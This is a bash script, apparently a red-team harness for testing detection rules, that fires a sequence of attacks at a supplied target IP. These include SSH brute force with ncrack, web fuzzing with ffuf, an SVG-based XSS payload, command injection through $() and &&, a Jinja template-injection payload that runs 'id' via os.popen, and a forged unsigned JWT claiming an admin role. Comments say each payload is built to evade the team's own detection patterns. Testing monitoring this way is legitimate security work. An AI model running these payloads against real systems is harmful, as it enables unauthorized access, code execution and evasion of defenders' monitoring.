#!/bin/bash
TARGET_IP="$1"
echo "=== REDTEAM_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [R1] SSH brute force with ncrack (different tool than hydra), unseen account svc_audit ---"
timeout 60 ncrack -p22 --user svc_audit -P /tmp/passlist.txt "$TARGET_IP" 2>&1 | tail -10

echo "--- [R2] Web recon with ffuf (different tool than gobuster), different wordlist ---"
timeout 60 ffuf -u "http://$TARGET_IP/FUZZ" -w /usr/share/dirb/wordlists/big.txt -mc 200 -t 30 -s 2>&1 | tail -10

echo "--- [R3] XSS EVASION: SVG-based payload, avoids our rule's exact patterns (no <script, no onerror=, no alert() literal, no <img) ---"
curl -s -m 5 "http://$TARGET_IP/profile?name=%3Csvg%2Fonload%3Dtop%5B%27al%27%2B%27ert%27%5D(1)%3E" >/dev/null

echo "--- [R4] COMMAND INJECTION EVASION: uses \$() and && instead of ; ` | ---"
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%24(whoami)" >/dev/null
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%26%26id" >/dev/null

echo "--- [R5] SSTI EVASION: split-string dunder technique (proven bypass from our own CTF work), avoids literal __class__/{{ substring match ---"
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode 'note={% set c = "".__cla__+"ss__" %}test' >/dev/null
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode "note={{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}" >/dev/null

echo "--- [R6] Known blind spot check: JWT-style forged header (expected to be invisible to access-log monitoring) ---"
curl -s -m 5 "http://$TARGET_IP/login" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." >/dev/null

echo "=== REDTEAM_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
